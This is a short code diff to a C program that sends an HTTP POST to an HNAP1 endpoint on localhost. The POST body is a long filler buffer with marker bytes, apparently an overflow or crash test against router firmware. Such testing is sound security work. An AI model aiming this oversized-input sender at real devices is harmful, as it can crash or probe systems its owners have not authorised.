@@ -8,7 +8,7 @@
 
 #define IP_ADDRESS "127.0.0.1"
 #define HTTP_PORT 8080
-#define PACKET 4000
+#define PACKET 1000
 int main(int argc, char *argv)
 {
 	struct sockaddr_in serv_addr;
@@ -33,8 +33,11 @@ int main(int argc, char *argv)
 	}
 	
 	char dataBuffer[PACKET];
-	memset((char *)&dataBuffer, 'a', sizeof(dataBuffer));
+	memset(dataBuffer, '\0', sizeof(dataBuffer));
+	memset(dataBuffer, 'a', sizeof(dataBuffer));
 	dataBuffer[PACKET-1] = '\0';
+	dataBuffer[PACKET-2] = '*';
+	dataBuffer[PACKET-3] = 'X';
 	long dataBufferLen = strlen(dataBuffer);
 	#define PACKET_HEADER "POST /HNAP1/ HTTP/1.1\r\n" \
 	"Host: %s\r\n" \
@@ -45,6 +48,7 @@ int main(int argc, char *argv)
 	char sendBuffer[PACKET+200];
 	sprintf(sendBuffer, PACKET_HEADER, IP_ADDRESS, dataBufferLen, dataBuffer);
 	int sendBufferLen = strlen(sendBuffer);
+	fprintf(stdout, "sendBufferLen = %d\ndata =\n%s\n", sendBufferLen, sendBuffer);
 	ret = send(sockfd, sendBuffer, sendBufferLen, MSG_CONFIRM );
 	if (ret < 0) {
 		close(sockfd);
